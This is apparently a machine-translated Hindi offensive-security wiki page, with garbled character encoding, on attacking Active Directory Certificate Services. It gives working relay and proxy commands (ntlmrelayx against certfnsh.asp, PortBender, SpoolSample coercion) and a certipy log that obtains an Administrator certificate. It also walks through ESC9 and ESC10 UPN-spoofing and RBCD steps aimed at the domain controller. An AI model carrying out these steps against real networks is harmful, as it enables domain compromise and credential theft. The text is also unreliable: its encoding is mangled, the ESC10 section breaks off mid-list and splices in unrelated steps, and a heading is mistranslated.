* **рд╡реЗрдм рдирд╛рдорд╛рдВрдХрди рдЗрдВрдЯрд░рдлрд╝реЗрд╕** (рдПрдХ рдкреБрд░рд╛рдиреЗ рджрд┐рдЦрдиреЗ рд╡рд╛рд▓реЗ ASP рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЬрд┐рд╕реЗ `http://<caserver>/certsrv/` рдкрд░ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ), рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЗрд╡рд▓ HTTP рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрд╣ рд╡реНрдпрдХреНрддрд┐рдЧрддрддрд╛ HTTP рд╣реИрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЗрд╡рд▓ NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХреЗрд░рдмреЗрд░реЛрд╕ рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЕрдкреНрд░рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВред
* **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рд╕реЗрд╡рд╛** (CES), **рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдирд╛рдорд╛рдВрдХрди рдиреАрддрд┐** (CEP) рд╡реЗрдм рд╕реЗрд╡рд╛ рдФрд░ **рдиреЗрдЯрд╡рд░реНрдХ рдЙрдкрдХрд░рдг рдирд╛рдорд╛рдВрдХрди рд╕реЗрд╡рд╛** (NDES) рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдкрдиреЗ рдЕрдзрд┐рдХреГрддрддрд╛ HTTP рд╣реИрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдиреЗрдЧреЛрдЯрд┐рдПрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВред рдиреЗрдЧреЛрдЯрд┐рдПрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг **рдХреЗрд░рдмреЗрд░реЛрд╕** рдФрд░ **NTLM** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ; рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рджреМрд░рд╛рди NTLM рдкреНрд░рдорд╛рдгреАрдХрд░рдг рддрдХ рдиреЗрдЧреЛрдЯрд┐рдПрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпреЗ рд╡реЗрдм рд╕реЗрд╡рд╛рдПрдВ рдХрдо рд╕реЗ рдХрдо рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ HTTPS рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреА рд╣реИрдВ, рд▓реЗрдХрд┐рди рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ HTTPS рд╕реНрд╡рдпрдВ рдореЗрдВ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдХреЗрд╡рд▓ рдЬрдм HTTPS рдХреЛ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддрдм HTTPS рд╕реЗрд╡рд╛рдПрдВ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рджреБрд░реНрднрд╛рдЧреНрдп рд╕реЗ, AD CS IIS рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЪреИрдирд▓ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреА рд╕рд╛рдорд╛рдиреНрдп **рд╕рдорд╕реНрдпрд╛рдПрдВ** рдпрд╣ рд╣реИрдВ рдХрд┐ **NTLM рд╕рддреНрд░ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЫреЛрдЯреЗ рд╣реЛрддреЗ рд╣реИрдВ** рдФрд░ рд╣рдорд▓рд╛рд╡рд░ **NTLM рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдПрдХ NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЗ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рд╕реАрдорд╛рдПрдВ рд╣рд▓ рд╣реЛ рдЬрд╛рддреА рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рд╕рддреНрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдп рд╣реЛрдиреЗ рддрдХ рдЬреАрд╡рд┐рдд рд░рд╣реЗрдЧрд╛ рдФрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **NTLM рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЛ рдкреНрд░рдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред рдЪреЛрд░реА рдХрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM рд░рд┐рд▓реЗ рд╣рдорд▓реЛрдВ рдХреА рдПрдХ рдФрд░ рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╡реЗ **рдПрдХ рдкреАрдбрд╝рд┐рдд рдЦрд╛рддрд╛ рдХреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдорд╢реАрди рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрдВрддрдЬрд╛рд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рдЗрд╕реЗ **рдмрд╛рдзреНрдп** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **рджреБрд░реБрдкрдпреЛрдЧ**

\*\*\*\*[**Certify**](https://github.com/GhostPack/Certify) рдХреЗ `cas` рдХрдорд╛рдВрдб рд╕реЗ **рд╕рдХреНрд░рд┐рдп HTTP AD CS рдЕрдВрдд-рдмрд┐рдВрджреБрдУрдВ рдХреА рдЬрд╛рдВрдЪ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>

рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬ CAs рдЕрдкрдиреЗ AD рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рднреА CES рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреЗ рд╣реИрдВ `msPKI-Enrollment-Servers` рдкреНрд░реЙрдкрд░реНрдЯреА рдореЗрдВред **Certutil.exe** рдФрд░ **PSPKI** рдЗрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдкрд╛рд░реНрд╕ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
#### Certify рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ

рдпрд╣ рддрдХрдиреАрдХ Certify рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) рдХреЗ рд╕рд╛рде рджреБрд░реБрдкрдпреЛрдЧ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Certipy `$` рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЦрд╛рддрд╛ рдирд╛рдо рдкрд░ рдЖрдзрд╛рд░рд┐рдд `Machine` рдпрд╛ `User` рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдЧрд╛ред рд╣рдо `-template` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдФрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд┐рд░ рд╣рдо [PetitPotam](https://github.com/ly4k/PetitPotam) рдЬреИрд╕реА рдПрдХ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд▓рдкреВрд░реНрд╡рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ `-template DomainController` рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╕реНрддрд╛рд░ - ESC9 <a href="#5485" id="5485"></a>

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

ESC9 рдирдП **`msPKI-Enrollment-Flag`** рдорд╛рди **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред рдпрджрд┐ рдЗрд╕ рдлреНрд▓реИрдЧ рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдирдИ `szOID_NTDS_CA_SECURITY_EXT` рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╕реНрддрд╛рд░** рдПрдореНрдмреЗрдб рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред ESC9 рдХреЗрд╡рд▓ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм `StrongCertificateBindingEnforcement` рдХреЛ `1` (рдбрд┐рдлрд╝реЙрд▓реНрдЯ) рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдХреЗрд░рдмреЗрд░реЛрд╕ рдпрд╛ рд╕реНрдХреИрдирд▓ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ ESC10 рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрдЧрд╛ - ESC9 рдХреЗ рдмрд┐рдирд╛ - рдХреНрдпреЛрдВрдХрд┐ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рд╕рдорд╛рди рд╣реЛрдВрдЧреАред

* `StrongCertificateBindingEnforcement` рдХреЛ `2` (рдбрд┐рдлрд╝реЙрд▓реНрдЯ: `1`) рдкрд░ рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ `CertificateMappingMethods` рдореЗрдВ `UPN` рдлрд╝реНрд▓реИрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИ
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ `msPKI-Enrollment-Flag` рдорд╛рди рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдлрд╝реНрд▓реИрдЧ рд╣реИ
* рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ рднреА рдХреНрд▓рд╛рдЗрдВрдЯ рдкреНрд░рдорд╛рдгреАрдХрд░рдг EKU рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ
* рдХрд┐рд╕реА рдЦрд╛рддреЗ A рдкрд░ `GenericWrite` рдХреЛрдИ рдЦрд╛рддрд╛ B рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

### рджреБрд░реБрдкрдпреЛрдЧ

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, `John@corp.local` рдХреЗ рдкрд╛рд╕ `Jane@corp.local` рдкрд░ `GenericWrite` рд╣реИ, рдФрд░ рд╣рдо `Administrator@corp.local` рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред `Jane@corp.local` рдХреЛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ `ESC9` рдореЗрдВ рдирд╛рдорд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдЬреЛ `msPKI-Enrollment-Flag` рдорд╛рди рдореЗрдВ `CT_FLAG_NO_SECURITY_EXTENSION` рдлрд╝реНрд▓реИрдЧ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо `Jane` рдХреЗ рд╣реИрд╢ рдХреЛ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рд╢реИрдбреЛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ (рд╣рдорд╛рд░реЗ `GenericWrite` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

рдЕрдЧрд▓реЗ, рд╣рдо `Jane` рдХреЗ `userPrincipalName` рдХреЛ `Administrator` рдмрдирд╛рддреЗ рд╣реИрдВред рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рдо `@corp.local` рднрд╛рдЧ рдХреЛ рдЫреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдПрдХ рдкреНрд░рддрд┐рдмрдВрдз рдЙрд▓реНрд▓рдВрдШрди рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ `Administrator` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ `userPrincipalName` `Administrator@corp.local` рд╣реИ рдФрд░ рди рдХрд┐ `Administrator`ред

рдЕрдм, рд╣рдо `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рднрд╛рд╡рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЯреЗрдореНрдкрд▓реЗрдЯ `ESC9` рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред рд╣рдореЗрдВ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ `Jane` рдХреЗ рд░реВрдк рдореЗрдВ рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ `userPrincipalName` `Administrator` рд╣реИ рдФрд░ рдЬрд╛рд░реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ "рдСрдмреНрдЬреЗрдХреНрдЯ SID" рдирд╣реАрдВ рд╣реИред

рдлрд┐рд░, рд╣рдо `Jane` рдХреЗ `userPrincipalName` рдХреЛ рдХреБрдЫ рдФрд░, рдЬреИрд╕реЗ рдЙрд╕рдХреЗ рдореВрд▓ `userPrincipalName` `Jane@corp.local`, рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

рдЕрдм, рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рддреЛ рд╣рдореЗрдВ `Administrator@corp.local` рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдПрдирдЯреА рд╣реИрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛ред рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореЗрдВ рдХреЛрдИ рдбреЛрдореЗрди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг рдЕрдкрдиреА рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдореЗрдВ `-domain <domain>` рдЬреЛрдбрд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ - ESC10

### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

ESC10 рдирд┐рдпрдВрддреНрд░рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкрд░ рджреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреА рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрджрд░реНрднрд┐рдд рдХрд░рддрд╛ рд╣реИред

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `0x18` (`0x8 | 0x10`), рдкрд╣рд▓реЗ `0x1F`ред

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` `StrongCertificateBindingEnforcement`ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдорд╛рди `1`, рдкрд╣рд▓реЗ `0`ред

**рдорд╛рдорд▓рд╛ 1**

`StrongCertificateBindingEnforcement` рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ

**рдорд╛рдорд▓рд╛ 2**

`CertificateMappingMethods` рдореЗрдВ `UPN` рдмрд┐рдЯ (`0x4`) рд╢рд╛рдорд┐рд▓ рд╣реИ

### рджреБрд░реБрдкрдпреЛрдЧ рдорд╛рдорд▓рд╛ 1

* `StrongCertificateBindingEnforcement` рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ
* `
рддрдм рд╣рдо `Jane` рдХреЗ `userPrincipalName` рдХреЛ рд╡рд╛рдкрд╕ рдмрджрд▓рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдХреБрдЫ рдФрд░ рдмрдирд╛рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдЙрд╕рдХрд╛ рдореВрд▓ `userPrincipalName` (`Jane@corp.local`)ред

<figure><img src="../../../.gitbook/assets/image (9) (1) (3).png" alt=""><figcaption></figcaption></figure>

рдЕрдм, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреА рдЪрд╛рдмреА Schannel рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рд╣реЛрддреА рд╣реИ, рд╣рдореЗрдВ Schannel рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдпрд╣рд╛рдВ Certipy рдХрд╛ рдирдпрд╛ `-ldap-shell` рд╡рд┐рдХрд▓реНрдк рдЙрдкрдпреЛрдЧ рдореЗрдВ рдЖрддрд╛ рд╣реИред

рдпрджрд┐ рд╣рдо рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдФрд░ `-ldap-shell` рдХреЗ рд╕рд╛рде рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рддреЛ рд╣рдо рджреЗрдЦреЗрдВрдЧреЗ рдХрд┐ рд╣рдо `u:CORP\DC$` рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рд╣реЛ рд░рд╣реЗ рд╣реИрдВред рдпрд╣ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реИ рдЬреЛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

<figure><img src="../../../.gitbook/assets/image (21) (2) (1).png" alt=""><figcaption></figcaption></figure>

LDAP рд╢реИрд▓ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдЖрдкрддреНрддрд┐ рдореЗрдВ рд╕реЗ рдПрдХ `set_rbcd` рд╣реИ, рдЬреЛ рд▓рдХреНрд╖реНрдп рдкрд░ рд╕рдВрд╕рд╛рдзрд┐рдд рд╕рдВрд╕рд╛рдзрди-рдЖрдзрд╛рд░рд┐рдд рд╕реАрдорд┐рдд рдЕрдзрд┐рд░реЛрд╣рдг (RBCD) рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рд╣рдо рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ RBCD рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

<figure><img src="../../../.gitbook/assets/image (7) (1) (2) (2).png" alt=""><figcaption></figcaption></figure>

рд╡реИрдХрд▓реНрдкрд┐рдХ рд░реВрдк рд╕реЗ, рд╣рдо рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреЛ рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ `userPrincipalName` рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ рдпрд╛ рдЬрд╣рд╛рдВ `userPrincipalName` рдЙрд╕ рдЦрд╛рддреЗ рдХреЗ `sAMAccountName` рд╕реЗ рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ред рдореЗрд░реЗ рдЦреБрдж рдХреЗ рдкрд░реАрдХреНрд╖рдг рд╕реЗ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдХ `Administrator@corp.local` рдХреЗ рдкрд╛рд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `userPrincipalName` рд╕реЗрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕ рдЦрд╛рддреЗ рдХреЗ рдкрд╛рд╕ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ LDAP рдореЗрдВ рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдЕрдзрд┐рдХ рдЕрдзрд┐рдХрд╛рд░ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдПред

## рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рдирд╕реНрдкрддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рдирд╛

